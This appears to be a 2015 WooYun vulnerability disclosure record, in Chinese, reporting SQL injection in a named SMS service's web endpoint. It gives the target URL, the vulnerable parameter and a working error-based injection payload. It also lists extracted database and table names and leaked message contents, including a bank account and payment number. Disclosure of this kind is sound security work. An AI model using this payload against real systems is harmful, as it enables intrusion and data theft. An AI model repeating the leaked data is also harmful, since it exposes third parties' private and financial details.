{"id": 82038, "wybug_id": "wooyun-2015-0152221", "wybug_title": "吉信通某分站sql注入漏洞", "wybug_corp": "吉信通", "wybug_author": "niexinming", "wybug_date": "2015-11-08 16:46", "wybug_open_date": "2015-12-23 16:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-12-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 吉信通-9万用户见证,10年诚信服务!打造第一品牌。 详细说明：  http://service2.winic.org/Service.asmx?op=GET_MSP_MO\n\n这个连接的uid有sql注入漏洞，把前面插入的语句闭合，然后再继续构造就可以爆了在uid里面输入：1','','','');select convert(int,@@version) --报错：\n\n在将 nvarchar 值 'Microsoft SQL Server 2005 - 9.00.5000.00 (Intel X86) \tDec 10 2010 10:56:29 \tCopyright (c) 1988-2005 Microsoft Corporation\tDeveloper Edition on Windows NT 5.2 (Build 3790: Service Pack 2)' 转换成数据类型 int 时失败。   漏洞证明：  它服务器前面有防火墙，禁了我好几个ip之后，我决定手工来挖：先来部分的数据库，感觉他有好多数据库，由于是手工，所以就爆了几个：SMS_serviceSMS_Records    PUBLIC_DBYes_sms_sysdbyes_sms_recordpppcenterhcdbSCCPERPBACK_SMS_UserAndAgentEasycrmsmsuser_backup_tofilecmpp3sgipgdcmpptelcomcmpp6cmpp8cmpp4cmpp2smstestdbsgipshsmgpacmpp1cmpp5Voice_Recordcmpp7        SMS_service数据库里面的部分表：mobareaweb_catalogvotetimesendtelsubtelredmsgv_priceSqlInsmstypesearch_syspro_search_sysNoticepromessagessendlogdemoV_listmt部分数据：在将 nvarchar 值 '尊敬的客户，您本期贷款扣款已失败，我司已为您向出借人履行了代偿义务，请还款至我司对公账户，新鸿基融资担保（沈阳）有限公司；账号：124905113910609；开户行：招行沈阳北站支行，若已缴清还款则无需理会，谢谢合作，联系电话：4001805200！【新鸿基融资担保】' 转换成数据类型 int 时失败。在将 nvarchar 值 '支付宝账号：18050047281。  名称：厦门慧家物流有限公司。转账时请备注您注册的手机号及姓名。' 转换成数据类型 int 时失败。验证是否可以跨库：SMS_Records 数据库的两个表：[sendlog_20150807]  [sendlog_20150929]sendlog_20150807 表部分数据：ime：07072201796852180707313560993466   修复方案：  过滤就好，大晚上的手工了这么多东西也是不容易，九万多用户也够多的，希望你们重视一下   版权声明：转载请注明来源 niexinming@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}